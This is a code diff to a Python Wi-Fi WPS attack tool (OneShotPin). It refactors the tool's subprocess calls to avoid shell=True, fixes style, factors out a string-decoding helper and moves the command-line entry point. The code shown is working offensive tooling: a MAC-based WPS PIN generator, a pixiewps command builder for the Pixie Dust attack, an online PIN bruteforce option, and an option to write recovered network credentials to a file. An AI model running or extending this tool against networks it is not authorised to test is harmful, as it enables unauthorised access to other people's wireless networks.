@@ -56,9 +56,11 @@ class NetworkAddress:
 
     def __iadd__(self, other):
         self.integer += other
+        return self
 
     def __isub__(self, other):
         self.integer -= other
+        return self
 
     def __eq__(self, other):
         return self.integer == other.integer
@@ -303,30 +305,24 @@ class WPSpin:
 
     def pinAirocon(self, mac):
         b = [int(i, 16) for i in mac.string.split(':')]
-        pin = ((b[0] + b[1]) % 10)\
-        + (((b[5] + b[0]) % 10) * 10)\
-        + (((b[4] + b[5]) % 10) * 100)\
-        + (((b[3] + b[4]) % 10) * 1000)\
-        + (((b[2] + b[3]) % 10) * 10000)\
-        + (((b[1] + b[2]) % 10) * 100000)\
-        + (((b[0] + b[1]) % 10) * 1000000)
+        pin = (((b[0] + b[1]) % 10)
+               + (((b[5] + b[0]) % 10) * 10)
+               + (((b[4] + b[5]) % 10) * 100)
+               + (((b[3] + b[4]) % 10) * 1000)
+               + (((b[2] + b[3]) % 10) * 10000)
+               + (((b[1] + b[2]) % 10) * 100000)
+               + (((b[0] + b[1]) % 10) * 1000000))
         return pin
-
-
-def recvuntil(pipe, what):
-    s = ''
-    while True:
-        inp = pipe.stdout.read(1)
-        if inp == '':
-            return s
-        s += inp
-        if what in s:
-            return s
 
 
 def get_hex(line):
     a = line.split(':', 3)
     return a[2].replace(' ', '').upper()
+
+
+def _decode_str(s):
+    """Decode a unicode-escaped Latin-1 byte string to a UTF-8 Python string."""
+    return codecs.decode(s, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
 
 
 class PixiewpsData:
@@ -346,12 +342,11 @@ class PixiewpsData:
                 and self.e_hash1 and self.e_hash2)
 
     def get_pixie_cmd(self, full_range=False):
-        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
-                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
-                    self.pke, self.pkr, self.e_hash1,
-                    self.e_hash2, self.authkey, self.e_nonce)
+        pixiecmd = ['pixiewps', '--pke', self.pke, '--pkr', self.pkr,
+                    '--e-hash1', self.e_hash1, '--e-hash2', self.e_hash2,
+                    '--authkey', self.authkey, '--e-nonce', self.e_nonce]
         if full_range:
-            pixiecmd += ' --force'
+            pixiecmd += ['--force']
         return pixiecmd
 
 
@@ -439,8 +434,9 @@ class Companion:
 
     def __init_wpa_supplicant(self):
         print('[*] Running wpa_supplicant…')
-        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
-        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+        cmd = ['wpa_supplicant', '-K', '-d', '-Dnl80211,wext,hostapd,wired',
+               '-i', self.interface, '-c', self.tempconf]
+        self.wpas = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         # Waiting for wpa_supplicant control interface initialization
         while True:
@@ -499,32 +495,32 @@ class Companion:
                 print('[-] Error: wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
-                assert(len(self.pixie_creds.e_nonce) == 16*2)
+                assert len(self.pixie_creds.e_nonce) == 16*2
                 if pixiemode:
                     print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
-                assert(len(self.pixie_creds.pkr) == 192*2)
+                assert len(self.pixie_creds.pkr) == 192*2
                 if pixiemode:
                     print('[P] PKR: {}'.format(self.pixie_creds.pkr))
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pke = get_hex(line)
-                assert(len(self.pixie_creds.pke) == 192*2)
+                assert len(self.pixie_creds.pke) == 192*2
                 if pixiemode:
                     print('[P] PKE: {}'.format(self.pixie_creds.pke))
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.pixie_creds.authkey = get_hex(line)
-                assert(len(self.pixie_creds.authkey) == 32*2)
+                assert len(self.pixie_creds.authkey) == 32*2
                 if pixiemode:
                     print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash1 = get_hex(line)
-                assert(len(self.pixie_creds.e_hash1) == 32*2)
+                assert len(self.pixie_creds.e_hash1) == 32*2
                 if pixiemode:
                     print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash2 = get_hex(line)
-                assert(len(self.pixie_creds.e_hash2) == 32*2)
+                assert len(self.pixie_creds.e_hash2) == 32*2
                 if pixiemode:
                     print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
             elif 'Network Key' in line and 'hexdump' in line:
@@ -542,19 +538,20 @@ class Companion:
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
-                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                self.connection_status.essid = _decode_str("'".join(line.split("'")[1:-1]))
             self.__print_with_indicators('*', 'Authenticating…')
         elif 'Authentication response' in line:
             self.__print_with_indicators('*', 'Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
-                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                self.connection_status.essid = _decode_str("'".join(line.split("'")[1:-1]))
             self.__print_with_indicators('*', 'Associating with AP…')
         elif ('Associated with' in line) and (self.interface in line):
             bssid = line.split()[-1].upper()
             if self.connection_status.essid:
-                self.__print_with_indicators('+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
+                self.__print_with_indicators(
+                    '+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
             else:
                 self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
         elif 'EAPOL: txStart' in line:
@@ -574,9 +571,9 @@ class Companion:
             signal = line.split("level=")[1].split(" ")[0]
             if 'noise=' in line:
                 noise = line.split("noise=")[1].split(" ")[0]
-                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
+                print("[i] Current signal: {}, noise: {}".format(signal, noise))
             else:
-                print ("[i] Current signal: {}".format(signal))
+                print("[i] Current signal: {}".format(signal))
 
         return True
 
@@ -584,8 +581,8 @@ class Companion:
         self.__print_with_indicators('*', 'Running Pixiewps…')
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
-            print(cmd)
-        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+            print(' '.join(cmd))
+        r = subprocess.run(cmd, stdout=subprocess.PIPE,
                            stderr=sys.stdout, encoding='utf-8', errors='replace')
         print(r.stdout)
         if r.returncode == 0:
@@ -844,7 +841,7 @@ class Companion:
         os.remove(self.tempconf)
 
     def __del__(self):
-        #self.cleanup()
+        # self.cleanup()
         try:
             self.cleanup()
         except (ImportError, AttributeError, TypeError):
@@ -890,8 +887,7 @@ class WiFiScanner:
             networks[-1]['BSSID'] = result.group(1).upper()
 
         def handle_essid(line, result, networks):
-            d = result.group(1)
-            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            networks[-1]['ESSID'] = _decode_str(result.group(1))
 
         def handle_level(line, result, networks):
             networks[-1]['Level'] = int(float(result.group(1)))
@@ -925,19 +921,16 @@ class WiFiScanner:
                 networks[-1]['WPS locked'] = True
 
         def handle_model(line, result, networks):
-            d = result.group(1)
-            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            networks[-1]['Model'] = _decode_str(result.group(1))
 
         def handle_modelNumber(line, result, networks):
-            d = result.group(1)
-            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            networks[-1]['Model number'] = _decode_str(result.group(1))
 
         def handle_deviceName(line, result, networks):
-            d = result.group(1)
-            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            networks[-1]['Device name'] = _decode_str(result.group(1))
 
-        cmd = 'iw dev {} scan'.format(self.interface)
-        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+        cmd = ['iw', 'dev', self.interface, 'scan']
+        proc = subprocess.run(cmd, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         lines = proc.stdout.splitlines()
         networks = []
@@ -986,18 +979,18 @@ class WiFiScanner:
             """
             # Calculate the original display width
             original_width = wcwidth.wcswidth(s)
-            
+
             # Scenario 1: The original width is exactly the same or smaller
             if original_width <= length:
                 # Calculate the number of spaces to be filled (by display width)
                 padding_needed = length - original_width
                 # Allocate spaces evenly to the right of the string
                 return s + ' ' * padding_needed
-            
+
             # Scenario 2: Truncation is required
             postfix_width = wcwidth.wcswidth(postfix)
             max_allowed = length - postfix_width
-            
+
             current_width = 0
             truncated = []
             for c in s:
@@ -1006,12 +999,12 @@ class WiFiScanner:
                     break
                 truncated.append(c)
                 current_width += char_width
-            
+
             # Construct basic results
             result = "".join(truncated)
             if len(truncated) < len(s):
                 result += postfix
-            
+
             # Accurately adjust the display width
             result_width = wcwidth.wcswidth(result)
             if result_width > length:
@@ -1035,7 +1028,7 @@ class WiFiScanner:
                         # If the limit is still exceeded after adding ellipsis, remove the ellipsis
                         safe_result = safe_result[:-1]
                 return safe_result
-            
+
             # Fill in exact spaces
             padding_needed = length - result_width
             return result + ' ' * padding_needed
@@ -1074,7 +1067,7 @@ class WiFiScanner:
             model = '{} {}'.format(network['Model'], network['Model number'])
             essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
             deviceName = truncateStr(network['Device name'], 27)
-    
+
             # Processing the display width of other fields
             processed_number = truncateStr(number, 4)
             processed_bssid = truncateStr(network['BSSID'], 18)
@@ -1082,7 +1075,7 @@ class WiFiScanner:
             processed_level = truncateStr(str(network['Level']), 4)
             processed_device = deviceName  # 27 columns of width have been processed
             processed_model = model  # Assuming that the model fields do not need to be truncated or have been processed
-            
+
             # Directly concatenate the processed fields, separated by spaces in the middle
             line_parts = [
                 processed_number,
@@ -1094,7 +1087,7 @@ class WiFiScanner:
                 processed_model
             ]
             line = ' '.join(line_parts)
-            
+
             if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                 print(colored(line, color='yellow'))
             elif network['WPS locked']:
@@ -1129,8 +1122,8 @@ def ifaceUp(iface, down=False):
         action = 'down'
     else:
         action = 'up'
-    cmd = 'ip link set {} {}'.format(iface, action)
-    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
+    cmd = ['ip', 'link', 'set', iface, action]
+    res = subprocess.run(cmd, stdout=sys.stdout, stderr=sys.stdout)
     if res.returncode == 0:
         return True
     else:
@@ -1168,170 +1161,13 @@ Advanced arguments:
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
-                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
+                               (for internal Wi-Fi adapters in MediaTek SoCs).
+                               Turn off Wi-Fi in system settings before using this.
     -v, --verbose            : Verbose output
 
 Example:
     %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
 """
-
-
-if __name__ == '__main__':
-    import argparse
-
-    parser = argparse.ArgumentParser(
-        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
-        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
-        )
-
-    parser.add_argument(
-        '-i', '--interface',
-        type=str,
-        required=True,
-        help='Name of the interface to use'
-        )
-    parser.add_argument(
-        '-b', '--bssid',
-        type=str,
-        help='BSSID of the target AP'
-        )
-    parser.add_argument(
-        '-p', '--pin',
-        type=str,
-        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
-        )
-    parser.add_argument(
-        '-K', '--pixie-dust',
-        action='store_true',
-        help='Run Pixie Dust attack'
-        )
-    parser.add_argument(
-        '-F', '--pixie-force',
-        action='store_true',
-        help='Run Pixiewps with --force option (bruteforce full range)'
-        )
-    parser.add_argument(
-        '-X', '--show-pixie-cmd',
-        action='store_true',
-        help='Always print Pixiewps command'
-        )
-    parser.add_argument(
-        '-B', '--bruteforce',
-        action='store_true',
-        help='Run online bruteforce attack'
-        )
-    parser.add_argument(
-        '--pbc', '--push-button-connect',
-        action='store_true',
-        help='Run WPS push button connection'
-        )
-    parser.add_argument(
-        '-d', '--delay',
-        type=float,
-        help='Set the delay between pin attempts'
-        )
-    parser.add_argument(
-        '-w', '--write',
-        action='store_true',
-        help='Write credentials to the file on success'
-        )
-    parser.add_argument(
-        '--iface-down',
-        action='store_true',
-        help='Down network interface when the work is finished'
-        )
-    parser.add_argument(
-        '--vuln-list',
-        type=str,
-        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
-        help='Use custom file with vulnerable devices list'
-    )
-    parser.add_argument(
-        '-l', '--loop',
-        action='store_true',
-        help='Run in a loop'
-    )
-    parser.add_argument(
-        '-r', '--reverse-scan',
-        action='store_true',
-        help='Reverse order of networks in the list of networks. Useful on small displays'
-    )
-    parser.add_argument(
-        '--mtk-wifi',
-        action='store_true',
-        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
-             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
-             'Turn off Wi-Fi in the system settings before using this.'
-    )
-    parser.add_argument(
-        '-v', '--verbose',
-        action='store_true',
-        help='Verbose output'
-        )
-
-    args = parser.parse_args()
-
-    if sys.hexversion < 0x03060F0:
-        die("The program requires Python 3.6 and above")
-    if os.getuid() != 0:
-        die("Run it as root")
-
-    if args.mtk_wifi:
-        wmtWifi_device = Path("/dev/wmtWifi")
-        if not wmtWifi_device.is_char_device():
-            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
-                "/dev/wmtWifi does not exist or it is not a character device")
-        wmtWifi_device.chmod(0o644)
-        wmtWifi_device.write_text("1")
-
-    if not ifaceUp(args.interface):
-        die('Unable to up interface "{}"'.format(args.interface))
-
-    while True:
-        try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            if args.pbc:
-                companion.single_connection(pbc_mode=True)
-            else:
-                if not args.bssid:
-                    try:
-                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                            vuln_list = file.read().splitlines()
-                    except FileNotFoundError:
-                        # Use embedded vulnerability database if external file not found
-                        vuln_list = VULN_DATABASE.strip().splitlines()
-                    scanner = WiFiScanner(args.interface, vuln_list)
-                    if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                    args.bssid = scanner.prompt_network()
-
-                if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    if args.bruteforce:
-                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                    else:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
-                                                    args.show_pixie_cmd, args.pixie_force)
-            if not args.loop:
-                break
-            else:
-                args.bssid = None
-        except KeyboardInterrupt:
-            if args.loop:
-                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…")
-                    break
-                else:
-                    args.bssid = None
-            else:
-                print("\nAborting…")
-                break
-
-    if args.iface_down:
-        ifaceUp(args.interface, down=True)
-
-    if args.mtk_wifi:
-        wmtWifi_device.write_text("0")
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -1502,3 +1338,160 @@ Modem/Router EV-2010-09-20
 RB06 RT2860
 RB03 RT2860
 """
+
+if __name__ == '__main__':
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
+        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
+        )
+
+    parser.add_argument(
+        '-i', '--interface',
+        type=str,
+        required=True,
+        help='Name of the interface to use'
+        )
+    parser.add_argument(
+        '-b', '--bssid',
+        type=str,
+        help='BSSID of the target AP'
+        )
+    parser.add_argument(
+        '-p', '--pin',
+        type=str,
+        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
+        )
+    parser.add_argument(
+        '-K', '--pixie-dust',
+        action='store_true',
+        help='Run Pixie Dust attack'
+        )
+    parser.add_argument(
+        '-F', '--pixie-force',
+        action='store_true',
+        help='Run Pixiewps with --force option (bruteforce full range)'
+        )
+    parser.add_argument(
+        '-X', '--show-pixie-cmd',
+        action='store_true',
+        help='Always print Pixiewps command'
+        )
+    parser.add_argument(
+        '-B', '--bruteforce',
+        action='store_true',
+        help='Run online bruteforce attack'
+        )
+    parser.add_argument(
+        '--pbc', '--push-button-connect',
+        action='store_true',
+        help='Run WPS push button connection'
+        )
+    parser.add_argument(
+        '-d', '--delay',
+        type=float,
+        help='Set the delay between pin attempts'
+        )
+    parser.add_argument(
+        '-w', '--write',
+        action='store_true',
+        help='Write credentials to the file on success'
+        )
+    parser.add_argument(
+        '--iface-down',
+        action='store_true',
+        help='Down network interface when the work is finished'
+        )
+    parser.add_argument(
+        '--vuln-list',
+        type=str,
+        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
+        help='Use custom file with vulnerable devices list'
+    )
+    parser.add_argument(
+        '-l', '--loop',
+        action='store_true',
+        help='Run in a loop'
+    )
+    parser.add_argument(
+        '-r', '--reverse-scan',
+        action='store_true',
+        help='Reverse order of networks in the list of networks. Useful on small displays'
+    )
+    parser.add_argument(
+        '--mtk-wifi',
+        action='store_true',
+        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
+             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
+             'Turn off Wi-Fi in the system settings before using this.'
+    )
+    parser.add_argument(
+        '-v', '--verbose',
+        action='store_true',
+        help='Verbose output'
+        )
+
+    args = parser.parse_args()
+
+    if sys.hexversion < 0x03060F0:
+        die("The program requires Python 3.6 and above")
+    if os.getuid() != 0:
+        die("Run it as root")
+
+    if args.mtk_wifi:
+        wmtWifi_device = Path("/dev/wmtWifi")
+        if not wmtWifi_device.is_char_device():
+            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
+                "/dev/wmtWifi does not exist or it is not a character device")
+        wmtWifi_device.chmod(0o644)
+        wmtWifi_device.write_text("1")
+
+    if not ifaceUp(args.interface):
+        die('Unable to up interface "{}"'.format(args.interface))
+
+    while True:
+        try:
+            companion = Companion(args.interface, args.write, print_debug=args.verbose)
+            if args.pbc:
+                companion.single_connection(pbc_mode=True)
+            else:
+                if not args.bssid:
+                    try:
+                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                            vuln_list = file.read().splitlines()
+                    except FileNotFoundError:
+                        # Use embedded vulnerability database if external file not found
+                        vuln_list = VULN_DATABASE.strip().splitlines()
+                    scanner = WiFiScanner(args.interface, vuln_list)
+                    if not args.loop:
+                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
+                    args.bssid = scanner.prompt_network()
+
+                if args.bssid:
+                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                    if args.bruteforce:
+                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                    else:
+                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
+                                                    args.show_pixie_cmd, args.pixie_force)
+            if not args.loop:
+                break
+            else:
+                args.bssid = None
+        except KeyboardInterrupt:
+            if args.loop:
+                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
+                    print("Aborting…")
+                    break
+                else:
+                    args.bssid = None
+            else:
+                print("\nAborting…")
+                break
+
+    if args.iface_down:
+        ifaceUp(args.interface, down=True)
+
+    if args.mtk_wifi:
+        wmtWifi_device.write_text("0")
